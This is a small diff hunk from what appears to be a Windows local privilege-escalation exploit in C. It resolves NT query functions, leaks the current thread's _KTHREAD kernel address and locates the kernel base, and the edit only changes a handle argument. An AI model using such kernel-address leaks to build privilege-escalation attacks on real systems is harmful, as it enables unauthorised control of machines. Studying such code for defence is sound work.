@@ -42,7 +42,7 @@ int main()
     NtQuerySystemInfor = (pNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
     NtQueryInfoToken = (pNtQueryInformationToken)GetProcAddress(ntdll, "NtQueryInformationToken");
 
-    kThreadAddr = GetkThreadAddrByHandle(GetCurrentProcess(), CurrentPid);
+    kThreadAddr = GetkThreadAddrByHandle(hCurrentProc, CurrentPid);
     printf("[+] _KTHREAD: %llx\n", kThreadAddr);
 
     NTOKernelBase = GetModuleAddrByName(NtoRootPath);
